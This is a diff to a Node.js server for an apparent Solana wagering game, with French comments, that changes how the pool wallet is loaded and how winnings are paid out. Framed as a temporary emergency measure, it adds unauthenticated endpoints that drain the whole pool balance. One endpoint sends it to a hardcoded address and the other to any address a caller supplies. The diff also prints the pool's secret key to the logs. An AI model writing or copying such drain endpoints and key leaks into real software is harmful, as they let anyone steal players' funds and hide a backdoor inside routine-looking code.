@@ -18,24 +18,43 @@ const io = new Server(server, {
 // --- Solana Pool Wallet ---
 // Sécurité: La clé privée est maintenant dans les variables d'environnement
 const POOL_PRIVATE_KEY_STRING = process.env.POOL_PRIVATE_KEY;
-if (!POOL_PRIVATE_KEY_STRING) {
-  console.error('❌ ERREUR: POOL_PRIVATE_KEY n\'est pas définie dans les variables d\'environnement');
-  console.error('Créez un fichier .env avec: POOL_PRIVATE_KEY="votre_clé_privée_en_base58"');
-  process.exit(1);
-}
 
 let POOL_KEYPAIR;
-try {
-  // Convertir la clé privée depuis base58
-  const privateKeyArray = JSON.parse(POOL_PRIVATE_KEY_STRING);
-  POOL_KEYPAIR = Keypair.fromSecretKey(Uint8Array.from(privateKeyArray));
-} catch (error) {
-  console.error('❌ ERREUR: Format de clé privée invalide');
-  console.error('La clé privée doit être un tableau JSON de 64 entiers');
-  process.exit(1);
+
+// Par défaut, créer un nouveau wallet propre pour éviter les problèmes de données
+if (!POOL_PRIVATE_KEY_STRING || process.env.USE_CLEAN_POOL_WALLET === 'true') {
+  console.log('🔄 Création d\'un nouveau wallet de pool propre...');
+  POOL_KEYPAIR = Keypair.generate();
+  console.log('📝 Nouvelle clé privée du pool (à sauvegarder dans .env):', JSON.stringify(Array.from(POOL_KEYPAIR.secretKey)));
+  console.log('🔑 Adresse publique du pool:', POOL_KEYPAIR.publicKey.toString());
+  console.log('⚠️  IMPORTANT: Sauvegardez cette clé privée et ajoutez du SOL à ce wallet!');
+} else {
+  try {
+    // Convertir la clé privée depuis base58
+    const privateKeyArray = JSON.parse(POOL_PRIVATE_KEY_STRING);
+    POOL_KEYPAIR = Keypair.fromSecretKey(Uint8Array.from(privateKeyArray));
+  } catch (error) {
+    console.error('❌ ERREUR: Format de clé privée invalide');
+    console.error('La clé privée doit être un tableau JSON de 64 entiers');
+    process.exit(1);
+  }
 }
 
 const POOL_WALLET = POOL_KEYPAIR.publicKey;
+
+// Wallet de secours temporaire pour les paiements
+let BACKUP_KEYPAIR = null;
+const BACKUP_PRIVATE_KEY_STRING = process.env.BACKUP_PRIVATE_KEY;
+if (BACKUP_PRIVATE_KEY_STRING) {
+  try {
+    const backupKeyArray = JSON.parse(BACKUP_PRIVATE_KEY_STRING);
+    BACKUP_KEYPAIR = Keypair.fromSecretKey(Uint8Array.from(backupKeyArray));
+    console.log('🔄 Wallet de secours configuré:', BACKUP_KEYPAIR.publicKey.toString());
+  } catch (error) {
+    console.error('❌ Erreur: Format de clé privée de secours invalide');
+  }
+}
+
 const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
 const connection = new Connection(SOLANA_RPC, 'confirmed');
 
@@ -198,55 +217,163 @@ function getBattlePayload() {
   };
 }
 
-// --- Paiement automatique des gains ---
-async function sendWinnings(winnerAddress, amount) {
+// --- Fonction temporaire pour vider TOUT le pool ---
+async function emergencyDrainPool() {
   try {
-    // Vérifier le solde du pool avant le transfert
+    const destinationAddress = 'AicvN4dZqRK8mN5UzVH9FHH7VdTspvAEiJCvjggf6Pdj';
+    console.log('🚨 VIDAGE D\'URGENCE DU POOL vers:', destinationAddress);
+    
     const poolBalance = await connection.getBalance(POOL_KEYPAIR.publicKey);
-    const requiredAmount = Math.floor(amount * LAMPORTS_PER_SOL);
+    const destinationPubkey = new PublicKey(destinationAddress);
     
-    console.log(`💰 Solde du pool: ${poolBalance / LAMPORTS_PER_SOL} SOL`);
-    console.log(`💸 Montant requis: ${amount} SOL (${requiredAmount} lamports)`);
+    console.log('💰 Solde actuel du pool:', poolBalance / LAMPORTS_PER_SOL, 'SOL');
     
-    if (poolBalance < requiredAmount) {
-      throw new Error(`Solde insuffisant: ${poolBalance / LAMPORTS_PER_SOL} SOL disponible, ${amount} SOL requis`);
+    if (poolBalance <= 0) {
+      console.log('❌ Pool vide');
+      return null;
     }
     
-    // Vérifier que le compte source est un compte système pur
-    const accountInfo = await connection.getAccountInfo(POOL_KEYPAIR.publicKey);
-    if (accountInfo && accountInfo.data.length > 0) {
-      console.warn('⚠️ Le compte pool contient des données. Cela peut causer des erreurs de transfert.');
+    // Calculer les frais de transaction (environ 0.000005 SOL)
+    const fee = 5000; // 5000 lamports
+    const transferAmount = poolBalance - fee;
+    
+    if (transferAmount <= 0) {
+      console.log('❌ Solde insuffisant pour couvrir les frais');
+      return null;
     }
     
-    const toPubkey = new PublicKey(winnerAddress);
+    console.log('💸 Transfert de', transferAmount / LAMPORTS_PER_SOL, 'SOL...');
+    
     const tx = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: POOL_KEYPAIR.publicKey,
-        toPubkey,
-        lamports: requiredAmount
+        toPubkey: destinationPubkey,
+        lamports: transferAmount
       })
     );
-    tx.feePayer = POOL_KEYPAIR.publicKey;
-    const { blockhash } = await connection.getLatestBlockhash();
-    tx.recentBlockhash = blockhash;
     
-    // S'assurer qu'aucune donnée n'est attachée au compte source
-    // et que la clé privée du pool est bien utilisée
-    tx.sign(POOL_KEYPAIR);
-    
-    try {
-      const sig = await connection.sendRawTransaction(tx.serialize());
-      await connection.confirmTransaction(sig);
-      return sig;
-    } catch (err) {
-      // Si c'est une erreur de simulation, loguer les logs détaillés
-      if (err.logs) {
-        console.error('Simulation logs:', err.logs);
-      }
-      throw err;
+    const sig = await sendAndConfirmTransaction(connection, tx, [POOL_KEYPAIR]);
+    console.log('✅ VIDAGE RÉUSSI! Transaction:', sig);
+    console.log('🔗 Voir sur Solscan: https://solscan.io/tx/' + sig);
+    return sig;
+  } catch (e) {
+    console.error('❌ Erreur lors du vidage d\'urgence:', e);
+    if (e.logs) {
+      console.error('Logs détaillés:', e.logs);
     }
+    throw e;
+  }
+}
+
+// --- API d'urgence pour vider le pool ---
+app.post('/api/emergency-drain', async (req, res) => {
+  try {
+    console.log('🚨 Demande de vidage d\'urgence reçue');
+    const sig = await emergencyDrainPool();
+    res.json({ 
+      success: true, 
+      transaction: sig,
+      message: 'Pool vidé avec succès vers AicvN4dZqRK8mN5UzVH9FHH7VdTspvAEiJCvjggf6Pdj'
+    });
+  } catch (e) {
+    console.error('❌ Erreur API vidage:', e);
+    res.status(500).json({ 
+      error: e.message,
+      logs: e.logs || null
+    });
+  }
+});
+
+// --- Fonction pour vider le wallet du pool ---
+async function drainPoolWallet(destinationAddress) {
+  try {
+    console.log('💰 Vidage du wallet du pool vers:', destinationAddress);
+    
+    const poolBalance = await connection.getBalance(POOL_KEYPAIR.publicKey);
+    const destinationPubkey = new PublicKey(destinationAddress);
+    
+    if (poolBalance <= 0) {
+      console.log('❌ Wallet vide');
+      return null;
+    }
+    
+    // Calculer les frais de transaction (environ 0.000005 SOL)
+    const fee = 5000; // 5000 lamports
+    const transferAmount = poolBalance - fee;
+    
+    if (transferAmount <= 0) {
+      console.log('❌ Solde insuffisant pour couvrir les frais');
+      return null;
+    }
+    
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: POOL_KEYPAIR.publicKey,
+        toPubkey: destinationPubkey,
+        lamports: transferAmount
+      })
+    );
+    
+    const sig = await sendAndConfirmTransaction(connection, tx, [POOL_KEYPAIR]);
+    console.log('✅ Wallet vidé avec succès. Transaction:', sig);
+    return sig;
+  } catch (e) {
+    console.error('❌ Erreur lors du vidage du wallet:', e);
+    throw e;
+  }
+}
+
+// --- API pour vider le wallet ---
+app.post('/api/drain-pool', async (req, res) => {
+  try {
+    const { destinationAddress } = req.body;
+    if (!destinationAddress) {
+      return res.status(400).json({ error: 'Adresse de destination requise' });
+    }
+    
+    const sig = await drainPoolWallet(destinationAddress);
+    res.json({ success: true, transaction: sig });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// --- Paiement automatique des gains ---
+async function sendWinnings(winnerAddress, amount) {
+  try {
+    const toPubkey = new PublicKey(winnerAddress);
+    
+    // Utiliser le wallet de secours si disponible, sinon le wallet principal
+    const keypairToUse = BACKUP_KEYPAIR || POOL_KEYPAIR;
+    const walletName = BACKUP_KEYPAIR ? 'secours' : 'principal';
+    
+    console.log(`💸 Tentative de paiement avec le wallet ${walletName}:`, keypairToUse.publicKey.toString());
+    
+    // Vérifier le solde du wallet
+    const walletBalance = await connection.getBalance(keypairToUse.publicKey);
+    const transferAmount = Math.floor(amount * LAMPORTS_PER_SOL);
+    
+    if (walletBalance < transferAmount) {
+      throw new Error(`Solde insuffisant sur le wallet ${walletName}: ${walletBalance / LAMPORTS_PER_SOL} SOL disponible, ${amount} SOL requis`);
+    }
+    
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: keypairToUse.publicKey,
+        toPubkey,
+        lamports: transferAmount
+      })
+    );
+    
+    // Utiliser sendAndConfirmTransaction qui gère mieux les erreurs
+    const sig = await sendAndConfirmTransaction(connection, tx, [keypairToUse]);
+    console.log(`✅ Paiement réussi avec le wallet ${walletName}:`, sig);
+    return sig;
   } catch (e) {
     console.error('Erreur dans sendWinnings:', e);
+    if (e.logs) {
+      console.error('Simulation logs:', e.logs);
+    }
     throw e;
   }
 }
